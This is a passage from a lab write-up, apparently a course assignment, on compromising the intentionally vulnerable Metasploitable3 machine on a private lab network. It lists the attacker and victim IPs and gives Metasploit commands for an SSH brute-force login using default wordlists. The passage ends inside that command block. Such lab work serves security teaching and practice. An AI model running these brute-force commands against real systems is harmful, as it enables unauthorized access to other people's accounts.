# 🚩 Phase 1: Attack Execution

This document Show a **detailed step-by-step guide** to compromising the **Metasploitable3** machine via:

1. ✅ **Task 1.1:** Using Metasploit framework.
2. ✅ **Task 1.2:** Using a custom Python script.

---

## 🌐 Network Information

- **Victim (Metasploitable3) IP:** `192.168.56.101`
![Metasploitable3 IP](./Picture1.png)

- **Attacker (Kali Linux) IP:** `192.168.56.102`
![Attacker IP](./Picture2.png)

---

## 🔍 Task 1.1: Using Metasploit Framework

We performed an SSH brute-force attack using the Metasploit framework.

### **Commands Used:**

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
show options
set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
set user_file /usr/share/wordlists/metasploit/unix_users.txt
set rhosts 192.168.56.101
exploit
